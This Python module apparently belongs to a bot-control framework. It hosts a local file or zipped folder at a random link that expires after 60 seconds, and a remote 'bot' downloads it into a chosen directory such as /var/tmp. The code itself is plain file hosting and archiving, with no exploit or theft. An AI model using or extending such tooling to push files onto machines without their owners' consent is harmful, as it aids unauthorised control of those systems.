# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

import os
import zipfile
from threading import Thread
from time import sleep

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Upload a file (or a folder, optionally recursively) to the bot.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Path to the local file or folder to upload: ",
            "Remote output directory (Leave empty for /var/tmp): ",
            "Include sub-folders recursively when archiving a folder? [y/N]: ",
            "New file name (Leave empty to use the original basename): "
        ]

    def setup(self, set_options):
        local_file = os.path.expanduser(set_options[0])
        output_dir = set_options[1]
        recursive = set_options[2].lower() if len(set_options) > 2 else ""
        output_name = set_options[3] if len(set_options) > 3 else ""

        if not output_dir:
            output_dir = "/var/tmp"
        if not output_name:
            output_name = os.path.basename(local_file)
        recursive = True if recursive in ["y", "yes"] else False

        # File existence check before upload.
        if not local_file or (not os.path.isfile(local_file) and not os.path.isdir(local_file)):
            self._view.display_error("Failed to find local file: {}".format(local_file))
            return False, None

        host_path = local_file
        archive_path = None

        # Folders can't be served through the single-file hosting URL, so archive them.
        if os.path.isdir(local_file):
            try:
                archive_path = self._archive_folder(local_file, recursive)
                host_path = archive_path
                output_name = (output_name or os.path.basename(local_file)) + ".zip"
            except Exception as ex:
                self._view.display_error("Failed to archive folder: {}".format(str(ex)))
                return False, None

        download_path = random_string(16)
        self._model.add_upload_file(download_path, host_path)

        self._view.output("Started hosting the file at: /{}".format(download_path))
        self._view.output("This link will automatically expire after 60 seconds.")

        cleanup_thread = Thread(target=self._cleanup_thread, args=(download_path, archive_path))
        cleanup_thread.daemon = True
        cleanup_thread.start()

        return True, {
            "download_path": download_path,
            "output_dir": output_dir,
            "output_name": output_name
        }

    def _archive_folder(self, folder_path, recursive):
        if not os.path.isdir(OUTPUT_DIRECTORY):
            os.mkdir(OUTPUT_DIRECTORY)

        archive_path = os.path.join(OUTPUT_DIRECTORY, random_string(8) + ".zip")

        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as archive:
            for root, dirs, files in os.walk(folder_path):
                if not recursive:
                    # Only top-level files are included when recursion is disabled.
                    dirs[:] = []

                for filename in files:
                    full_path = os.path.join(root, filename)
                    arcname = os.path.relpath(full_path, folder_path)
                    archive.write(full_path, arcname)
        return archive_path

    def _cleanup_thread(self, url_path, archive_path):
        sleep(60 * 1)

        self._model.remove_upload_file(url_path)
        self._view.output_separator()
        self._view.output("Upload link expired", "info")

        # Remove the temporary archive (if one was created) from disk.
        if archive_path and os.path.isfile(archive_path):
            try:
                os.remove(archive_path)
            except OSError as ex:
                self._view.output("Failed to remove temporary archive: {}".format(ex), "attention")

    def process_response(self, response, response_options):
        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()
        self._view.output(str_response)

        lower = str_response.lower()
        if "error" in lower or "failed" in lower or "exception" in lower:
            self._view.output("The upload reported a problem on the bot.", "attention")
        elif "finished" in lower or "saved to" in lower:
            self._view.output("Upload complete.", "info")
        else:
            self._view.output("No upload confirmation was returned by the bot.", "attention")
